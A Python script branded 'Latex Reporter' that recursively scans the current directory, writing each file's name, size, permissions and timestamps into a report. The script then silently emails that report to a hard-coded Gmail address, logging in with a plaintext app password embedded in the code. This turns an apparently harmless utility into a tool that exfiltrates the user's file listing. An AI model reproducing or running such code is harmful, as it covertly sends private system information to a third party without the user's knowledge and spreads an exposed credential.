#!/usr/bin/env python3


import os
import sys
import stat
import shutil
import time
from datetime import datetime
from pathlib import Path
import smtplib
from email.message import EmailMessage


# ---------- Utility Functions ----------

def human_readable(n):
    for unit in ['B', 'KiB', 'MiB', 'GiB', 'TiB', 'PiB']:
        if abs(n) < 1024.0:
            return f"{n:3.1f} {unit}"
        n /= 1024.0
    return f"{n:.1f} EiB"


def safe_stat(path: Path):
    try:
        st = path.stat()
        return st.st_size, st.st_mtime, st.st_ctime, st.st_mode
    except Exception:
        return None, None, None, None


def is_hidden(path: Path):
    if path.name.startswith("."):
        return True
    if os.name == "nt":
        try:
            import ctypes
            attrs = ctypes.windll.kernel32.GetFileAttributesW(str(path))
            if attrs == -1:
                return False
            return bool(attrs & 2)
        except Exception:
            return False
    return False


def permissions(mode):
    if mode is None:
        return "?????????"
    return stat.filemode(mode)


def live_status(processed, total_dirs):
    """Return a single-line scanning status message."""
    return f"\rScanning... Processed: {processed:,} items | Directories: {total_dirs:,}".ljust(100)


# ---------- Formatting ----------

def format_row(r):
    """Inline key-value style (one line per item)."""
    indent = "    " * r["depth"] + ("├─ " if r["depth"] else "├─ ")
    return (
        f"{indent}{r['name']} — "
        f"Type: {r['type']} | "
        f"Size: {r['size_hr']} | "
        f"Permissions: {r['perm']} | "
        f"Created: {r['created']} | "
        f"Modified: {r['modified']}"
    )


# ---------- Core Scanning Logic ----------

def scan_path(base: Path, path: Path, f, state, term_cols):
    try:
        size, mtime, ctime, mode = safe_stat(path)
        hidden = is_hidden(path)
        is_dir = path.is_dir()
        state["processed"] += 1

        print(live_status(state["processed"], state["dir_count"]), end="", flush=True)

        if is_dir:
            state["dir_count"] += 1
        else:
            state["file_count"] += 1
            state["total_size"] += size or 0

        row_data = {
            "name": path.name + (" (Hidden)" if hidden else ""),
            "type": "Directory" if is_dir else "File",
            "size_hr": human_readable(size or 0),
            "created": datetime.fromtimestamp(ctime).strftime("%Y-%m-%d %H:%M:%S") if ctime else "N/A",
            "modified": datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S") if mtime else "N/A",
            "perm": permissions(mode),
            "depth": len(path.relative_to(base).parts) - 1
        }

        f.write(format_row(row_data) + "\n")

        if state["processed"] % 100 == 0:
            f.flush()

        if is_dir:
            try:
                entries = sorted(path.iterdir(), key=lambda p: (not p.is_dir(), p.name.lower()))
                for entry in entries:
                    scan_path(base, entry, f, state, term_cols)

                depth_indent = "    " * (len(path.relative_to(base).parts) - 1)
                f.write(f"{depth_indent}└── [Finished: {path.name}]\n\n\n")
                if state["processed"] % 100 == 0:
                    f.flush()
            except PermissionError:
                pass

    except KeyboardInterrupt:
        raise
    except Exception:
        pass


def scan_directory(base: Path, f, divider):
    term_cols = shutil.get_terminal_size((100, 20)).columns

    f.write(f"Directory report for: {base}\n")
    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    f.write(divider + "\n")
    f.flush()

    state = {"processed": 0, "file_count": 0, "dir_count": 0, "total_size": 0}
    interrupted = False

    try:
        scan_path(base, base, f, state, term_cols)
    except KeyboardInterrupt:
        interrupted = True
        print("\n\nScan interrupted by user — writing partial report...")

    f.flush()
    return state["processed"], state["total_size"], state["file_count"], state["dir_count"], interrupted


# ---------- Email Function ----------

def send_email_report(to_email, subject, body, attachment_path):
    sender_email = "dhokabaz321@gmail.com"
    app_password = "oklb zqhr cujb emvc"  # Your app password

    msg = EmailMessage()
    msg["From"] = sender_email
    msg["To"] = to_email
    msg["Subject"] = subject
    msg.set_content(body)

    with open(attachment_path, "rb") as f:
        data = f.read()
        msg.add_attachment(data, maintype="text", subtype="plain", filename=attachment_path.name)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender_email, app_password)
            server.send_message(msg)
        print(f"Report successfully sent to {to_email}")
    except Exception as e:
        print(f"Failed to send email: {e}")


# ---------- Main ----------

def main():
    cwd = Path.cwd()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_txt = cwd / f"directory_report_{timestamp}.txt"

    divider = "-" * 120

    banner = """
*****************************************************************
*                          Latex Reporter                       *
*****************************************************************
"""
    print(banner)
    print(f"Scanning directory: {cwd}\n")
    print(f"Starting depth-first scan in {cwd}...\n")

    start_time = time.time()
    try:
        with out_txt.open("w", encoding="utf-8") as f:
            processed, total_size, file_count, dir_count, interrupted = scan_directory(cwd, f, divider)

            elapsed = time.time() - start_time
            f.write(divider + "\n")
            f.write(f"Total size: {human_readable(total_size)}\n")
            f.write(f"Total files: {file_count}\n")
            f.write(f"Total directories: {dir_count}\n")
            f.write(f"Total items: {processed}\n")
            f.write(f"Elapsed time: {elapsed:.2f} seconds\n")
            f.write("Status: Interrupted by user\n" if interrupted else "Status: Completed successfully\n")
            f.flush()
    except Exception as e:
        print("Error writing report:", e, file=sys.stderr)
        sys.exit(1)

    elapsed = time.time() - start_time
    print(f"\rScan complete in {elapsed:.2f}s ({processed:,} items).{' ' * 40}")
    print(f"Report saved to: {out_txt}")

    # Send email automatically
    email_subject = f"Directory Report: {cwd}"
    email_body = f"Directory report generated for {cwd}.\nStatus: {'Interrupted' if interrupted else 'Completed'}."
    send_email_report("dhokabaz321@gmail.com", email_subject, email_body, out_txt)


if __name__ == "__main__":
    main()
